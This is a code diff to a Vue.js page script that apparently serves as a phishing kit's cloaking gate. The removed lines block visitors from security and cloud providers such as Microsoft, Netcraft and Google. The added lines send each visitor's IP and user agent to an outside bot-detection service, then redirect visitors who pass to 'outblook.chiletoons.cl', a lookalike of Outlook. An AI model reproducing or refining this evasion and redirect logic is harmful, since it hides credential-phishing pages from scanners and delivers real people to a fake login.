@@ -17,48 +17,42 @@ const app = createApp({
       const result = await fp.get();
 
       try {
-        const ipInfo = await axios.get('https://ipapi.co/json/');
+        // Fetch the visitor's IP
+        const ipInfo = await axios.get('https://api64.ipify.org?format=json');
         visitorIP.value = ipInfo.data.ip;
-        const isp = ipInfo.data.org.toLowerCase();
 
-        // Updated list of ISPs to block on all attempts
-        const blockedISPs = [
-          "microsoft",
-          "netcraft",
-          "barracuda",
-          "amazon",
-          "google",
-          "ovh",
-          "digitalocean",
-          "cloudflare",
-          "fastly",
-          "akamai",
-          "oracle",
-          "ibm",
-          "linode"
-        ];
+        // Call your API to detect bot or blocked visitor
+        const response = await axios.post('https://rail-bot-production.up.railway.app/api/detect_bot', {
+          user_agent: navigator.userAgent,
+          ip: visitorIP.value,
+        });
 
-        if (blockedISPs.some(blockedISP => isp.includes(blockedISP))) {
-          isBlocked.value = true;
-          return;
-        }
+        const { is_bot, details } = response.data;
 
-        if (browser?.name === 'bot' || result.components?.adBlock?.value || result.components?.webdriver?.value) {
+        // Check if the visitor is detected as a bot or comes from a blocked ISP
+        if (is_bot) {
           isBot.value = true;
+
+          // Optional: Log the detection details
+          console.log('Blocked due to bot detection:', details);
         }
       } catch (error) {
-        console.error('Error fetching IP info:', error);
+        console.error('Error during bot detection:', error);
+        isBlocked.value = true; // Block access if there's an issue with the API
       }
     };
 
     onMounted(async () => {
       await checkVisitorReputation();
-      
+
+      // If not blocked or bot, proceed to the main page
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
           window.location.href = 'https://outblook.chiletoons.cl/';
         }, 3000);
       }
+
+      loading.value = false; // Stop the loading spinner
     });
 
     return { loading, isBot, isBlocked };
